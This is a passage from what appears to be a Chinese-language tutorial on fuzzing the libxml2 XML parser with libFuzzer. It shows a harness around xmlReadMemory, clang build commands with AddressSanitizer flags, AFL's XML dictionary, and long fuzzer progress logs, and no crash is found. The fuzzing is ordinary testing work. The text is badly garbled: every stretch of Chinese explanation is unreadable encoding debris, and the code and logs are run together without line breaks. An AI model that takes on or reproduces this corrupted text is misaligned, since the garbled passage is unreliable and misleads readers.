hardware counters, while your application executes. They are typically very efficient and do not incur a large runtime overhead. The sample data collected by the profiler can be used during compilation to determine what the most executed areas of the code are.ç”¨äºæ”¶é›†ç¨‹åºæ‰§è¡ŒæœŸé—´çš„ä¿¡æ¯æ¯”å¦‚ç¡¬ä»¶è®¡æ•°å™¨ï¼Œåœ¨ç¼–è¯‘æœŸé—´ä½¿ç”¨é‡‡æ ·åˆ†æå™¨æ‰€æ”¶é›†çš„æ•°æ®æ¥ç¡®å®šä»£ç ä¸­æœ€å€¼å¾—æ‰§è¡Œçš„åŒºåŸŸã€‚å› æ­¤ï¼Œä½¿ç”¨æ ·æœ¬åˆ†æå™¨ä¸­çš„æ•°æ®éœ€è¦å¯¹ç¨‹åºçš„æ„å»ºæ–¹å¼è¿›è¡Œä¸€äº›æ›´æ”¹ã€‚åœ¨ç¼–è¯‘å™¨å¯ä»¥ä½¿ç”¨åˆ†æä¿¡æ¯ä¹‹å‰ï¼Œä»£ç éœ€è¦åœ¨åˆ†æå™¨ä¸‹æ‰§è¡Œã€‚è¿™ä¹Ÿå¯¹æé«˜æˆ‘ä»¬fuzzæ•ˆç‡å¾ˆé‡è¦ã€‚æä¾›çš„harnessï¼š 1234567891011121314151617181920212223// Copyright 2015 The Chromium Authors. All rights reserved.// Use of this source code is governed by a BSD-style license that can be// found in the LICENSE file.#include &lt;stddef.h&gt;#include &lt;stdint.h&gt;#include &quot;libxml/parser.h&quot;void ignore (void* ctx, const char* msg, ...) { // Error handler to avoid spam of error messages from libxml parser.}extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) { xmlSetGenericErrorFunc(NULL, &amp;ignore); if (auto doc = xmlReadMemory(reinterpret_cast&lt;const char*&gt;(data), static_cast&lt;int&gt;(size), &quot;noname.xml&quot;, NULL, 0)) { xmlFreeDoc(doc); } return 0;} å°†è¾“å…¥çš„æ ·æœ¬ç±»å‹è½¬æ¢åäº¤ç»™xmlReadMemoryå¤„ç†ã€‚ç¼–è¯‘å¦‚ä¸‹ï¼šclang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -std=c++11 xml_read_memory_fuzzer.cc -I libxml2/include libxml2/.libs/libxml2.a -fsanitize=fuzzer -lz -o libxml2-v2.9.2-fsanitize_fuzzer1 ç”±äºç¼–è¯‘æ—¶ä½¿ç”¨äº†æ ·æœ¬åˆ†æå™¨ï¼Œfuzzçš„æ‰§è¡Œé€Ÿç‡å’Œè¦†ç›–ç‡éƒ½å¾ˆå¯è§‚ 123456789101112131415161718192021222324252627#2481433 NEW cov: 2018 ft: 9895 corp: 3523/671Kb lim: 1470 exec/s: 2038 rss: 553Mb L: 484/1470 MS: 1 CopyPart-#2481939 REDUCE cov: 2018 ft: 9895 corp: 3523/671Kb lim: 1470 exec/s: 2037 rss: 553Mb L: 390/1470 MS: 4 InsertByte-ChangeBit-ShuffleBytes-EraseBytes-#2482177 REDUCE cov: 2018 ft: 9895 corp: 3523/671Kb lim: 1470 exec/s: 2037 rss: 553Mb L: 816/1470 MS: 3 ChangeBit-ShuffleBytes-EraseBytes-#2482341 REDUCE cov: 2018 ft: 9895 corp: 3523/671Kb lim: 1470 exec/s: 2038 rss: 553Mb L: 41/1470 MS: 2 CopyPart-EraseBytes-#2482513 REDUCE cov: 2018 ft: 9896 corp: 3524/671Kb lim: 1470 exec/s: 2038 rss: 553Mb L: 604/1470 MS: 3 ChangeASCIIInt-ChangeASCIIInt-CopyPart-#2482756 REDUCE cov: 2018 ft: 9896 corp: 3524/671Kb lim: 1470 exec/s: 2038 rss: 553Mb L: 342/1470 MS: 2 InsertRepeatedBytes-EraseBytes-#2483073 REDUCE cov: 2018 ft: 9896 corp: 3524/671Kb lim: 1470 exec/s: 2038 rss: 553Mb L: 1188/1470 MS: 3 InsertByte-ShuffleBytes-EraseBytes-#2483808 REDUCE cov: 2018 ft: 9896 corp: 3524/671Kb lim: 1470 exec/s: 2037 rss: 553Mb L: 102/1470 MS: 2 InsertRepeatedBytes-EraseBytes-#2483824 REDUCE cov: 2018 ft: 9896 corp: 3524/671Kb lim: 1470 exec/s: 2037 rss: 553Mb L: 477/1470 MS: 1 EraseBytes-#2483875 REDUCE cov: 2018 ft: 9896 corp: 3524/671Kb lim: 1470 exec/s: 2037 rss: 553Mb L: 70/1470 MS: 3 CopyPart-ChangeByte-EraseBytes-#2483999 REDUCE cov: 2018 ft: 9896 corp: 3524/671Kb lim: 1470 exec/s: 2037 rss: 553Mb L: 604/1470 MS: 1 EraseBytes-#2485065 REDUCE cov: 2018 ft: 9896 corp: 3524/671Kb lim: 1480 exec/s: 2036 rss: 553Mb L: 32/1470 MS: 1 EraseBytes-#2485100 REDUCE cov: 2018 ft: 9896 corp: 3524/671Kb lim: 1480 exec/s: 2036 rss: 553Mb L: 139/1470 MS: 2 ChangeByte-EraseBytes-#2485127 REDUCE cov: 2018 ft: 9896 corp: 3524/671Kb lim: 1480 exec/s: 2036 rss: 553Mb L: 622/1470 MS: 1 EraseBytes-#2485277 REDUCE cov: 2018 ft: 9896 corp: 3524/671Kb lim: 1480 exec/s: 2037 rss: 553Mb L: 93/1470 MS: 1 EraseBytes-#2485465 REDUCE cov: 2019 ft: 9897 corp: 3525/671Kb lim: 1480 exec/s: 2037 rss: 553Mb L: 40/1470 MS: 1 PersAutoDict- DE: &quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05&quot;-#2485715 NEW cov: 2019 ft: 9899 corp: 3526/672Kb lim: 1480 exec/s: 2037 rss: 553Mb L: 1092/1470 MS: 3 ChangeBit-CopyPart-CopyPart-#2485805 REDUCE cov: 2019 ft: 9899 corp: 3526/672Kb lim: 1480 exec/s: 2037 rss: 553Mb L: 25/1470 MS: 2 ShuffleBytes-EraseBytes-#2486420 REDUCE cov: 2019 ft: 9899 corp: 3526/672Kb lim: 1480 exec/s: 2036 rss: 553Mb L: 336/1470 MS: 2 InsertByte-EraseBytes-#2486677 REDUCE cov: 2019 ft: 9899 corp: 3526/672Kb lim: 1480 exec/s: 2036 rss: 553Mb L: 33/1470 MS: 2 ChangeBit-EraseBytes-#2486836 REDUCE cov: 2019 ft: 9899 corp: 3526/672Kb lim: 1480 exec/s: 2036 rss: 553Mb L: 142/1470 MS: 1 EraseBytes-#2487217 REDUCE cov: 2019 ft: 9899 corp: 3526/672Kb lim: 1480 exec/s: 2037 rss: 553Mb L: 555/1470 MS: 1 EraseBytes-#2487243 REDUCE cov: 2019 ft: 9901 corp: 3527/673Kb lim: 1480 exec/s: 2037 rss: 553Mb L: 1464/1470 MS: 1 CopyPart-#2487595 NEW cov: 2019 ft: 9902 corp: 3528/675Kb lim: 1480 exec/s: 2035 rss: 553Mb L: 1430/1470 MS: 4 ShuffleBytes-ChangeByte-ChangeBinInt-CopyPart-#2487978 REDUCE cov: 2019 ft: 9902 corp: 3528/675Kb lim: 1480 exec/s: 2035 rss: 553Mb L: 34/1470 MS: 2 ChangeBit-EraseBytes-#2487997 REDUCE cov: 2019 ft: 9902 corp: 3528/675Kb lim: 1480 exec/s: 2036 rss: 553Mb L: 534/1470 MS: 1 EraseBytes-#2488103 REDUCE cov: 2019 ft: 9902 corp: 3528/675Kb lim: 1480 exec/s: 2036 rss: 553Mb L: 62/1470 MS: 4 ChangeBit-PersAutoDict-ShuffleBytes-EraseBytes- DE: &quot;UT&quot;- ä½†è¿Ÿè¿Ÿæ²¡æœ‰crashã€‚è¿™å¯èƒ½æœ‰å¾ˆå¤šåŸå› ï¼š1.ç¨‹åºå¾ˆå¥å£®ã€‚2.æˆ‘ä»¬é€‰æ‹©çš„æ¥å£å‡½æ•°ä¸åˆé€‚ 3.å¼‚å¸¸æ£€æµ‹çš„è®¾ç½®ä¸å½“ã€‚è¿™ä¸‰ä¸ªå¯èƒ½çš„åŸå› ä¸­ç¨‹åºæ˜¯å¦å¥å£®æˆ‘ä»¬ä¸å¾—è€ŒçŸ¥ï¼Œæ¥å£å‡½æ•°æ˜¯å¦åˆé€‚æˆ‘ä»¬é€šè¿‡è¦†ç›–ç‡äº†è§£åˆ°ä»¥xmlReadMemoryä½œä¸ºå…¥å£å‡½æ•°æ‰§è¡Œåˆ°çš„ä»£ç å—è¿˜æ˜¯è¾ƒé«˜çš„ï¼Œä½†ä¹Ÿæœ‰å¯èƒ½å› ä¸ºæ¼æ´ä¸åœ¨æ¥å£å‡½æ•°çš„éƒ¨åˆ†ã€‚ç¬¬ä¸‰ä¸ªå¯èƒ½ï¼Œç”±äºå¼‚å¸¸æ£€æµ‹çš„è®¾ç½®ä¸å½“å¯¼è‡´å³ä½¿äº§ç”Ÿäº†å¼‚å¸¸ä½†å› ä¸ºäºè®¾ç½®çš„å¼‚å¸¸æ£€æµ‹ä¸åŒ¹é…å’Œæ²¡æœ‰æ•è·åˆ°ã€‚å›å¤´çœ‹ä¸‹æˆ‘ä»¬çš„santizeè®¾ç½®ä¸ºaddresså¼€å¯å†…å­˜é”™è¯¯æ£€æµ‹å™¨(AddressSanitizer)ï¼Œè¯¥é€‰é¡¹è¾ƒä¸ºé€šç”¨ä¸”å®½æ³›(æ— éstack/heap_overflow)ï¼Œä½†å…¶å®è¿˜æœ‰ä¸€äº›æ›´å…·é’ˆå¯¹è¡Œçš„é€‰é¡¹ï¼š 12345678910-fsanitize-address-field-padding=&lt;value&gt; Level of field padding for AddressSanitizer -fsanitize-address-globals-dead-stripping Enable linker dead stripping of globals in AddressSanitizer -fsanitize-address-poison-custom-array-cookie Enable poisoning array cookies when using custom operator new[] in AddressSanitizer -fsanitize-address-use-after-scope Enable use-after-scope detection in AddressSanitizer -fsanitize-address-use-odr-indicator Enable ODR indicator globals to avoid false ODR violation reports in partially sanitized programs at the cost of an increase in binary size å…¶ä¸­æœ‰ä¸€ä¸ª-fsanitize-address-use-after-scopeæè¿°ä¸ºå¼€å¯use-after-scopeæ£€æµ‹ï¼Œå°†å…¶åŠ å…¥åˆ°ç¼–è¯‘é€‰é¡¹ä¸­ï¼Œå†æ¬¡ç¼–è¯‘ã€‚ 1234567export FUZZ_CXXFLAGS=&quot;-O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope&quot;CXX=&quot;clang++ $FUZZ_CXXFLAGS&quot; CC=&quot;clang $FUZZ_CXXFLAGS&quot; \\ CCLD=&quot;clang++ $FUZZ_CXXFLAGS&quot; ./configuremake -j$(nproc)clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope -std=c++11 xml_read_memory_fuzzer.cc -I libxml2/include libxml2/.libs/libxml2.a -fsanitize=fuzzer -lz -o libxml2-v2.9.2-fsanitize_fuzzer1 è·‘äº†ä¸€ä¼šå„¿ä¾ç„¶æ²¡æœ‰æ”¶è·ï¼Œçœ‹æ¥è¿™å°†ä¼šæ˜¯ä¸€ä¸ªè¾ƒé•¿æ—¶é—´çš„è¿‡ç¨‹ã€‚ 123456789101112131415161718#1823774 REDUCE cov: 2019 ft: 9428 corp: 3417/499Kb lim: 1160 exec/s: 2867 rss: 546Mb L: 229/1150 MS: 4 ChangeBinInt-InsertByte-InsertByte-EraseBytes-#1823804 REDUCE cov: 2019 ft: 9429 corp: 3418/500Kb lim: 1160 exec/s: 2867 rss: 546Mb L: 508/1150 MS: 3 CopyPart-EraseBytes-CopyPart-#1824507 REDUCE cov: 2019 ft: 9429 corp: 3418/500Kb lim: 1160 exec/s: 2868 rss: 546Mb L: 24/1150 MS: 1 EraseBytes-#1824608 REDUCE cov: 2019 ft: 9429 corp: 3418/500Kb lim: 1160 exec/s: 2864 rss: 546Mb L: 474/1150 MS: 4 InsertRepeatedBytes-ChangeASCIIInt-PersAutoDict-CrossOver- DE: &quot;\\xff\\xff\\xffN&quot;-#1824748 REDUCE cov: 2019 ft: 9429 corp: 3418/500Kb lim: 1160 exec/s: 2864 rss: 546Mb L: 1066/1143 MS: 5 ChangeASCIIInt-CMP-PersAutoDict-ChangeBit-EraseBytes- DE: &quot;ISO-8859-1&quot;-&quot;\\xfe\\xff\\xff&quot;-#1825344 REDUCE cov: 2019 ft: 9429 corp: 3418/500Kb lim: 1160 exec/s: 2865 rss: 546Mb L: 25/1143 MS: 1 EraseBytes-#1825716 REDUCE cov: 2019 ft: 9429 corp: 3418/500Kb lim: 1160 exec/s: 2866 rss: 546Mb L: 437/1143 MS: 3 InsertRepeatedBytes-InsertRepeatedBytes-EraseBytes-#1825879 REDUCE cov: 2019 ft: 9429 corp: 3418/500Kb lim: 1160 exec/s: 2866 rss: 546Mb L: 73/1143 MS: 4 CMP-ChangeASCIIInt-ChangeBit-EraseBytes- DE: &quot;\\x01\\x00\\x00P&quot;-#1826898 REDUCE cov: 2019 ft: 9429 corp: 3418/500Kb lim: 1170 exec/s: 2863 rss: 546Mb L: 453/1143 MS: 3 ChangeByte-ChangeASCIIInt-EraseBytes-#1827221 REDUCE cov: 2019 ft: 9429 corp: 3418/500Kb lim: 1170 exec/s: 2863 rss: 546Mb L: 404/1143 MS: 1 EraseBytes-#1827788 REDUCE cov: 2019 ft: 9429 corp: 3418/500Kb lim: 1170 exec/s: 2864 rss: 546Mb L: 47/1143 MS: 1 EraseBytes-#1828282 REDUCE cov: 2019 ft: 9429 corp: 3418/500Kb lim: 1170 exec/s: 2861 rss: 546Mb L: 112/1143 MS: 4 CMP-ChangeBit-ChangeByte-EraseBytes- DE: &quot;O&gt;/&lt;&quot;-#1828714 REDUCE cov: 2019 ft: 9429 corp: 3418/500Kb lim: 1170 exec/s: 2861 rss: 546Mb L: 7/1143 MS: 1 EraseBytes-#1828728 REDUCE cov: 2019 ft: 9429 corp: 3418/500Kb lim: 1170 exec/s: 2861 rss: 546Mb L: 163/1143 MS: 1 EraseBytes-#1828756 NEW cov: 2020 ft: 9430 corp: 3419/501Kb lim: 1170 exec/s: 2861 rss: 546Mb L: 1155/1155 MS: 1 CopyPart-#1828812 REDUCE cov: 2020 ft: 9430 corp: 3419/501Kb lim: 1170 exec/s: 2861 rss: 546Mb L: 42/1155 MS: 2 ChangeBit-EraseBytes-#1828952 REDUCE cov: 2020 ft: 9430 corp: 3419/501Kb lim: 1170 exec/s: 2862 rss: 546Mb L: 380/1155 MS: 1 EraseBytes-#1829111 REDUCE cov: 2020 ft: 9430 corp: 3419/501Kb lim: 1170 exec/s: 2862 rss: 546Mb L: 542/1155 MS: 3 InsertByte-ChangeASCIIInt-EraseBytes- ä½†æˆ‘ä»¬ä¸èƒ½æ”¾ä»»å…¶fuzzï¼Œè¦æƒ³ä¸€äº›åŠæ³•å»æé«˜æˆ‘ä»¬fuzzçš„æ•ˆç‡ï¼Œè¿™å…¶ä¸­ä¸€ä¸ªåŠæ³•å°±æ˜¯ä½¿ç”¨å­—å…¸ã€‚ æˆ‘ä»¬çŸ¥é“åŸºæœ¬ä¸Šæ‰€æœ‰çš„ç¨‹åºéƒ½æ˜¯å¤„ç†çš„æ•°æ®å…¶æ ¼å¼æ˜¯ä¸åŒçš„ï¼Œæ¯”å¦‚ xmlæ–‡æ¡£ï¼Œ pngå›¾ç‰‡ç­‰ç­‰ã€‚è¿™äº›æ•°æ®ä¸­ä¼šæœ‰ä¸€äº›ç‰¹æ®Šå­—ç¬¦åºåˆ— ï¼ˆæˆ–è€…è¯´å…³é”®å­—ï¼‰ï¼Œ æ¯”å¦‚åœ¨xmlæ–‡æ¡£ä¸­å°±æœ‰CDATAï¼Œ&lt;!ATTLISTç­‰ï¼Œpngå›¾ç‰‡å°±æœ‰png å›¾ç‰‡å¤´ã€‚å¦‚æœæˆ‘ä»¬äº‹å…ˆå°±æŠŠè¿™äº›å­—ç¬¦åºåˆ—åˆ—ä¸¾å‡ºæ¥å—ï¼Œfuzzç›´æ¥ä½¿ç”¨è¿™äº›å…³é”®å­—å»ç»„åˆï¼Œå°±ä¼šå°±å¯ä»¥å‡å°‘å¾ˆå¤šæ²¡æœ‰æ„ä¹‰çš„å°è¯•ï¼ŒåŒæ—¶è¿˜æœ‰å¯èƒ½ä¼šèµ°åˆ°æ›´æ·±çš„ç¨‹åºåˆ†æ”¯ä¸­å»ã€‚è¿™é‡Œwhorkshopå°±æä¾›äº†AFLä¸­æ‰€ä½¿ç”¨çš„dict: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889//xml.dictâœ 08 git:(master) âœ— cat xml.dict # Copyright 2016 Google Inc.## Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);# you may not use this file except in compliance with the License.# You may obtain a copy of the License at## http://www.apache.org/licenses/LICENSE-2.0## Unless required by applicable law or agreed to in writing, software# distributed under the License is distributed on an &quot;AS IS&quot; BASIS,# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.# See the License for the specific language governing permissions and# limitations under the License.################################################################################### AFL dictionary for XML# ----------------------## Several basic syntax elements and attributes, modeled on libxml2.## Created by Michal Zalewski &lt;lcamtuf@google.com&gt;#attr_encoding=&quot; encoding=\\&quot;1\\&quot;&quot;attr_generic=&quot; a=\\&quot;1\\&quot;&quot;attr_href=&quot; href=\\&quot;1\\&quot;&quot;attr_standalone=&quot; standalone=\\&quot;no\\&quot;&quot;attr_version=&quot; version=\\&quot;1\\&quot;&quot;attr_xml_base=&quot; xml:base=\\&quot;1\\&quot;&quot;attr_xml_id=&quot; xml:id=\\&quot;1\\&quot;&quot;attr_xml_lang=&quot; xml:lang=\\&quot;1\\&quot;&quot;attr_xml_space=&quot; xml:space=\\&quot;1\\&quot;&quot;attr_xmlns=&quot; xmlns=\\&quot;1\\&quot;&quot;entity_builtin=&quot;&amp;lt;&quot;entity_decimal=&quot;&amp;#1;&quot;entity_external=&quot;&amp;a;&quot;entity_hex=&quot;&amp;#x1;&quot;string_any=&quot;ANY&quot;string_brackets=&quot;[]&quot;string_cdata=&quot;CDATA&quot;string_col_fallback=&quot;:fallback&quot;string_col_generic=&quot;:a&quot;string_col_include=&quot;:include&quot;string_dashes=&quot;--&quot;string_empty=&quot;EMPTY&quot;string_empty_dblquotes=&quot;\\&quot;\\&quot;&quot;string_empty_quotes=&quot;''&quot;string_entities=&quot;ENTITIES&quot;string_entity=&quot;ENTITY&quot;string_fixed=&quot;#FIXED&quot;string_id=&quot;ID&quot;string_idref=&quot;IDREF&quot;string_idrefs=&quot;IDREFS&quot;string_implied=&quot;#IMPLIED&quot;string_nmtoken=&quot;NMTOKEN&quot;string_nmtokens=&quot;NMTOKENS&quot;string_notation=&quot;NOTATION&quot;string_parentheses=&quot;()&quot;string_pcdata=&quot;#PCDATA&quot;string_percent=&quot;%a&quot;string_public=&quot;PUBLIC&quot;string_required=&quot;#REQUIRED&quot;string_schema=&quot;:schema&quot;string_system=&quot;SYSTEM&quot;string_ucs4=&quot;UCS-4&quot;string_utf16=&quot;UTF-16&quot;string_utf8=&quot;UTF-8&quot;string_xmlns=&quot;xmlns:&quot;tag_attlist=&quot;&lt;!ATTLIST&quot;tag_cdata=&quot;&lt;![CDATA[&quot;tag_close=&quot;&lt;/a&gt;&quot;tag_doctype=&quot;&lt;!DOCTYPE&quot;tag_element=&quot;&lt;!ELEMENT&quot;tag_entity=&quot;&lt;!ENTITY&quot;tag_ignore=&quot;&lt;![IGNORE[&quot;tag_include=&quot;&lt;![INCLUDE[&quot;tag_notation=&quot;&lt;!NOTATION&quot;tag_open=&quot;&lt;a&gt;&quot;tag_open_close=&quot;&lt;a /&gt;&quot;tag_open_exclamation=&quot;&lt;!&quot;tag_open_q=&quot;&lt;?&quot;tag_sq2_close=&quot;]]&gt;&quot;tag_xml_q=&quot;&lt;?xml?&gt;&quot; å…¶ä¸­å…³é”®å­—å°±æ˜¯â€â€é‡Œçš„å†…å®¹ï¼Œlibfuzzerä¼šä½¿ç”¨è¿™äº›å…³é”®å­—è¿›è¡Œç»„åˆæ¥ç”Ÿæˆæ ·æœ¬ã€‚å­—å…¸ä½¿ç”¨æ–¹æ³•./libxml2-v2.9.2-fsanitize_fuzzer1 -max_total_time=60 -print_final_stats=1 -dict=./xml.dict corpus1æ‰§è¡Œç»“æœï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168#468074 REDUCE cov: 2521 ft: 8272 corp: 2493/82Kb lim: 135 exec/s: 7801 rss: 452Mb L: 105/135 MS: 4 InsertRepeatedBytes-CMP-CopyPart-CrossOver- DE: &quot;\\x01\\x00\\x00\\x00&quot;-#468322 REDUCE cov: 2521 ft: 8272 corp: 2493/82Kb lim: 135 exec/s: 7805 rss: 452Mb L: 85/135 MS: 3 CopyPart-CopyPart-EraseBytes-#468381 REDUCE cov: 2521 ft: 8273 corp: 2494/82Kb lim: 135 exec/s: 7806 rss: 452Mb L: 74/135 MS: 1 InsertByte-#468390 REDUCE cov: 2521 ft: 8273 corp: 2494/82Kb lim: 135 exec/s: 7806 rss: 452Mb L: 66/135 MS: 2 ChangeASCIIInt-EraseBytes-#468391 REDUCE cov: 2521 ft: 8273 corp: 2494/82Kb lim: 135 exec/s: 7806 rss: 452Mb L: 89/135 MS: 1 EraseBytes-#468575 DONE cov: 2521 ft: 8273 corp: 2494/82Kb lim: 135 exec/s: 7681 rss: 452Mb###### Recommended dictionary. ######&quot;\\x08\\x00&quot; # Uses: 366&quot;Q\\x00&quot; # Uses: 370&quot;\\x00:&quot; # Uses: 325&quot;\\x97\\x00&quot; # Uses: 301&quot;\\x0d\\x00&quot; # Uses: 335&quot;\\xfe\\xff\\xff\\xff&quot; # Uses: 273&quot;UCS-&quot; # Uses: 294&quot;\\x15\\x00&quot; # Uses: 277&quot;\\x00\\x00&quot; # Uses: 289&quot;\\xff\\xff\\xff\\x1c&quot; # Uses: 258&quot;\\xff\\xff\\xff!&quot; # Uses: 257&quot;\\xff\\xff\\xff\\x01&quot; # Uses: 250&quot;UTF-1&quot; # Uses: 250&quot;\\xff\\xff\\xffN&quot; # Uses: 236&quot;UTF-16LE&quot; # Uses: 223&quot;ISO-10&quot; # Uses: 228&quot;ISO-1064&quot; # Uses: 256&quot;\\x0a\\x00\\x00\\x00&quot; # Uses: 246&quot;Q\\x00\\x00\\x00&quot; # Uses: 247&quot;\\xf1\\x1f\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 212&quot;$\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 194&quot;\\xff\\xff\\xff\\x0e&quot; # Uses: 211&quot;\\x09\\x00&quot; # Uses: 226&quot;\\x01\\x00\\x00\\xfa&quot; # Uses: 212&quot;\\x01\\x00\\x00\\x02&quot; # Uses: 239&quot;\\xac\\x0f\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 206&quot;\\xffO&quot; # Uses: 263&quot;\\xff\\x03&quot; # Uses: 235&quot;\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x10&quot; # Uses: 200&quot;\\xf4\\x01\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 203&quot;UTF-16BE&quot; # Uses: 188&quot;\\x00\\x00\\x00P&quot; # Uses: 207&quot;\\x0a\\x00&quot; # Uses: 196&quot;\\xff\\xff&quot; # Uses: 203&quot;\\xff\\xff\\xff\\xff\\xff\\x97\\x96\\x80&quot; # Uses: 186&quot;\\x01 \\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 187&quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00$&quot; # Uses: 156&quot;P\\x00&quot; # Uses: 186&quot;\\xff\\xff\\xff\\xff&quot; # Uses: 197&quot;\\xff\\xff\\xff\\x09&quot; # Uses: 202&quot;\\x12\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 204&quot;\\x01\\x01&quot; # Uses: 170&quot;\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x10&quot; # Uses: 197&quot;\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x03&quot; # Uses: 183&quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 174&quot;\\xff\\x05&quot; # Uses: 198&quot;US-ASCII&quot; # Uses: 214&quot;\\x01\\x00&quot; # Uses: 201&quot;xlmns&quot; # Uses: 189&quot;\\xff\\xff\\xff\\x14&quot; # Uses: 191&quot;xmlsn&quot; # Uses: 179&quot;\\x00\\x00\\x00\\x03&quot; # Uses: 201&quot;xmlns&quot; # Uses: 182&quot;\\xaf\\x0f\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 186&quot;\\xff\\xff\\xff\\xff\\xff\\xff\\x0e\\xb9&quot; # Uses: 176&quot;\\xff\\x09&quot; # Uses: 178&quot;ISO-1&quot; # Uses: 191&quot;la&quot; # Uses: 157&quot;\\x01\\x00\\x00\\x00&quot; # Uses: 173&quot;\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x14&quot; # Uses: 172&quot;\\xff\\xff\\xff\\x7f\\x00\\x00\\x00\\x00&quot; # Uses: 164&quot;\\x00\\x00\\x00\\x04&quot; # Uses: 154&quot;\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 153&quot;\\x00\\x00\\x00\\x02&quot; # Uses: 136&quot;\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 140&quot;ISO-10646-&quot; # Uses: 146&quot;id&quot; # Uses: 155&quot;\\x00\\x01&quot; # Uses: 145&quot;\\x00\\x02&quot; # Uses: 140&quot;\\x01\\x00\\x00\\x08&quot; # Uses: 165&quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1e&quot; # Uses: 136&quot;\\xff\\xff\\xff\\xff~\\xff\\xff\\xff&quot; # Uses: 130&quot;\\x81\\x96\\x98\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 150&quot;\\x03\\x00\\x00\\x00&quot; # Uses: 116&quot;\\x18\\x00\\x00\\x00&quot; # Uses: 176&quot;\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xf9&quot; # Uses: 124&quot;%\\x17\\x8f[&quot; # Uses: 130&quot;\\x0e\\x00\\x00\\x00&quot; # Uses: 142&quot;\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\xfa&quot; # Uses: 96&quot;\\x06\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 116&quot;\\x00\\x04&quot; # Uses: 161&quot;\\x00\\x00\\x00\\x0b&quot; # Uses: 119&quot;\\x00\\x00\\x00\\x06&quot; # Uses: 141&quot;annnn\\xd4nnnnnn&quot; # Uses: 100&quot;\\x1f\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 106&quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x17&quot; # Uses: 114&quot;\\x16\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 122&quot;\\x0f\\x00&quot; # Uses: 121&quot;inlc0a&quot; # Uses: 128&quot;\\x01\\x00\\x00O&quot; # Uses: 101&quot;\\x01\\x04&quot; # Uses: 117&quot;\\x01P&quot; # Uses: 122&quot;\\xfb\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 95&quot;\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 107&quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03&quot; # Uses: 98&quot;\\x00#&quot; # Uses: 102&quot;\\x00\\x00\\x00\\x0d&quot; # Uses: 92&quot;ISO-8859-1&quot; # Uses: 100&quot;\\xff\\xf9&quot; # Uses: 77&quot;\\xf7\\x0f\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 79&quot;\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xfb&quot; # Uses: 82&quot;\\x01\\x0b&quot; # Uses: 101&quot;\\xff\\xff\\xff\\xff\\xff\\xff\\x0e\\xff&quot; # Uses: 78&quot;&gt;&lt;&gt;\\xb7&quot; # Uses: 81&quot;&lt;b&quot; # Uses: 81&quot;UTF-8\\x00&quot; # Uses: 76&quot;\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x09&quot; # Uses: 63&quot;#\\x00\\x00\\x00&quot; # Uses: 75&quot;S\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 73&quot;a\\xff&quot; # Uses: 70&quot;TIONb&quot; # Uses: 46&quot;\\x01\\x00\\x00?&quot; # Uses: 69&quot;!\\x00\\x00\\x00&quot; # Uses: 67&quot;\\x00\\x00\\x00\\x01&quot; # Uses: 74&quot;\\xff\\xff\\xff\\xff\\xff\\xff\\x1f\\x02&quot; # Uses: 57&quot;\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x16&quot; # Uses: 57&quot;-\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 53&quot;\\x01\\x00\\x00\\x05&quot; # Uses: 65&quot;:b&quot; # Uses: 67&quot;\\x17\\x1c_&gt;&quot; # Uses: 63&quot;\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\x18&quot; # Uses: 64&quot;\\x00\\x00\\x00'&quot; # Uses: 45&quot;\\x00\\x00\\x00\\x05&quot; # Uses: 52&quot;\\xff\\xff\\xff\\x0d&quot; # Uses: 51&quot;US-AS&quot; # Uses: 48&quot;a&gt;&quot; # Uses: 53&quot;C\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 44&quot;\\xff\\xff\\x00\\x00&quot; # Uses: 36&quot;\\x01\\x07&quot; # Uses: 49&quot;@\\x00\\x00\\x00&quot; # Uses: 